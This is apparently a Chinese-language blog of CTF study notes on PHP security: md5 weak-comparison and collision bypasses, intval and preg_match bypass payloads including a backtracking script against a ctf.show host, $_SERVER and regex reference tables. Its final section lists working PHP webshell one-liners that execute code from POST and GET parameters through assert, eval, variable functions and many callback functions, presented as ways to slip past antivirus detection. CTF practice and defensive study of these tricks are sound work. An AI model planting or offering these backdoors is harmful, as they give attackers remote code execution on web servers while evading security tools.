<h1 id="php函数绕过"><a href="#php函数绕过" class="headerlink" title="php函数绕过"></a>php函数绕过</h1><p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D;null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D;null<br>strpos(Array(),“abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h3><p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
<p>数组绕过</p>
<p>var_dump(md5($_GET[‘a’]) &#x3D;&#x3D; md5($_GET[‘b’]))<br>1<br>传入</p>
<p>a[]&#x3D;a&amp;b[]&#x3D;b<br>虽然会报错，但是判断为真</p>
<p>可以看到，MD5一个数组返回了null，null&#x3D;&#x3D;null，成功绕过</p>
<ol start="3">
<li>强类型绕过<br>if((string)$_POST[‘a’] !&#x3D;&#x3D; (string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($_POST[‘b’]))</li>
</ol>
<p>md5 碰撞</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>进行url解码后的MD5值相等</p>
<p>收录一些MD5值相等的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line"></span><br><span class="line">$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;</span><br><span class="line">$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="a-x3D-x3D-md5-a"><a href="#a-x3D-x3D-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)"></a>$a&#x3D;&#x3D;md5($a)</h3><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 函数可以获取变量的「整数值」。常用于强制类型转换</p>
<p>直到遇上数字或正负符号才开始做转换，再遇到非数字或<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>结束时，结束转换</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(‘100a123’)=100</span><br><span class="line">intval(‘a123’)=0</span><br><span class="line">`?id=&#x27;1000&#x27; //&quot;1000&quot;或(1000)皆可</span><br><span class="line">?id=125&lt;&lt;3 //左移</span><br><span class="line">?id=680|320 //按位或</span><br><span class="line">?id=992^8 //按位异或</span><br><span class="line">?id=~~1000 //两次取反</span><br><span class="line">?id=0x3e8 //十六进制</span><br><span class="line">?id=0b1111101000 //二进制`</span><br></pre></td></tr></table></figure>

<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://.ctf.show:8080/&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=ctfshow[]</span><br></pre></td></tr></table></figure>

<h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><p><code>.</code>不会匹配换行符，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="variable">$json</span><span class="operator">=</span><span class="string">&quot;<span class="subst">\n</span>flag&quot;</span></span><br></pre></td></tr></table></figure>

<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要传入</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?a=flag%0a</span><br></pre></td></tr></table></figure>





<h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><table>
<thead>
<tr>
<th>元素&#x2F;代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>返回当前执行脚本的文件名。</td>
</tr>
<tr>
<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>返回当前运行脚本所在的服务器的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>返回当前运行脚本所在的服务器的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
<td>返回服务器标识字符串（比如 Apache&#x2F;2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PROTOCOL’]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP&#x2F;1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_METHOD’]</td>
<td>返回访问页面使用的请求方法（例如 POST）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_TIME’]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。</td>
</tr>
<tr>
<td>$_SERVER[‘QUERY_STRING’]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT’]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
<td>返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_HOST’]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_REFERER’]</td>
<td>返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTPS’]</td>
<td>是否通过安全 HTTP 协议查询脚本。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_ADDR’]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_HOST’]</td>
<td>返回浏览当前页面的用户的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_PORT’]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>返回当前执行脚本的绝对路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADMIN’]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PORT’]</td>
<td>Web 服务器使用的端口。默认值为 “80”。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SIGNATURE’]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘PATH_TRANSLATED’]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_NAME’]</td>
<td>返回当前脚本的路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_URI’]</td>
<td>返回当前页面的 URI。</td>
</tr>
</tbody></table>
<p>3get_defined_functions(void)</p>
<p>获取所有已经定义的函数,包含内部函数和用户定义的函数。</p>
<p>输出用户定义的函数方法为：</p>
<p>$hhh&#x3D;get_defined_functions();var_dump($hhh[‘user’]);</p>
<p> get_defined_constants(void)</p>
<p>返回所有可用的常量，包含系统常量和用户定义的常量。</p>
<p> get_declared_classes(void)</p>
<p>返回所有可用的类，包含系统类和用户定义的类。</p>
<p>get_included_files()</p>
<p>返回所有的包含的文件路径的数组，included 和 required 的包含文件</p>
<p><strong>需要了解的超全局变量</strong></p>
<p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚</p>
<p>本的全部作用域中都可用。在函数或方法中无需执</p>
<p>行 global $variable; 就可以访问它们。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>

<p> $GLOBALS — 引用全局作用域中可用的全部变量</p>
<p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变</p>
<p>量（从函数或方法中均可）。</p>
<p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量</p>
<p>的名字就是数组的键。</p>
<p>下面的例子展示了如何使用超级全局变量 $GLOBALS：</p>
<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">75</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">25</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;z&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addition</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：95</p>
<p>在上面的例子中，由于 z 是 $GLOBALS 数组中的变量，因此在函数之</p>
<p>外也可以访问它。</p>
<p>2 $_SERVER</p>
<p>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息。</p>
<p>下面的例子展示了如何使用 $_SERVER 中的某些元素：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://websec.readthedocs.io/zh/latest/basic/index.html</span><br></pre></td></tr></table></figure>

<h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><p><a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="匹配公式语法"><a href="#匹配公式语法" class="headerlink" title="匹配公式语法"></a>匹配公式语法</h2><table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
<h1 id="动态性探究"><a href="#动态性探究" class="headerlink" title="动态性探究"></a>动态性探究</h1><p>大家都说 PHP 动态性强，因此就不怕杀软的疯狂识别，那么到底强在什么地方？</p>
<p>其实就是因为 PHP 具有一些十分奇特的特性，大体可分为三类，动态特性类，代码漏洞类、PHP解析类，下面列举了其中常见的几种</p>
<h2 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.可变变量"></a>1.可变变量</h2><p>可变变量允许我们动态地改变一个变量的名称。所有的语言都允许改变变量的值，但是并没有太多的语言允许改变变量的类型，至于支持改变变量的名称的语言就更少了</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这就等价于：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>著名的“双刀大法”</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$b</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">  <span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  <span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-可变函数"><a href="#2-可变函数" class="headerlink" title="2.可变函数"></a>2.可变函数</h2><p>如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它</p>
<p>利用可变函数，我们可以将函数名也作为参数进行传递，避免敏感关键字被静态检测识别出来</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>此例一般都是使用<code>assert</code>，因为<code>eval</code>不能被可变函数调用</p>
<h2 id="3-回调函数"><a href="#3-回调函数" class="headerlink" title="3.回调函数"></a>3.回调函数</h2><p>回调函数是指调用函数的时候将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数</p>
<p>使用回调函数是为了可以将一段自己定义的功能传到函数内部使用</p>
<p>众所周知回调函数也是十分危险的</p>
<p>最简单的如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">eval</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结合可变函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newsSearch</span>(<span class="params"><span class="variable">$para0</span>,<span class="variable">$para1</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$evil</span>=<span class="variable">$para0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$para1</span>,<span class="keyword">array</span>(<span class="variable">$evil</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exec</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">newsSearch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;tid&#x27;</span>],<span class="variable">$exec</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>目前来讲，大部分常见的能作为后门的回调函数和类都被各大杀软列入名单，但是还是能够找到一些较生僻的回调函数，能够用来绕过杀软。</p>
<p>在函数描述中，参数列表中使用伪类型 <code>callback</code> 描述的，即是回调函数</p>
<p>目前常见的回调函数有</p>
<p>uasort&#x2F;uksort</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$arr</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">uksort</span>(<span class="variable">$arr</span>, <span class="variable">$e</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uasort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line"><span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uksort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>preg_filter</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_filter</span>(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>array_filter&#x2F;array_map</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$arr</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure>

<p>array_walk&#x2F;array_walk_recursive</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>array_udiff</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newsSearch</span>(<span class="params"><span class="variable">$para0</span>,<span class="variable">$para1</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$evil</span>=<span class="variable">$para0</span>;</span><br><span class="line">    <span class="variable">$exec</span>=<span class="variable">$para1</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_udiff</span>(<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="variable">$evil</span>),<span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="variable">$exec</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exec</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;exec&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">newsSearch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>],<span class="variable">$exec</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">array_udiff</span>(<span class="variable">$arr</span>, <span class="variable">$arr2</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>

<p>header_register_callback</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header_register_callback</span>(<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;return assert($_POST[\&#x27;k\&#x27;]);&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>register_tick_function</p>
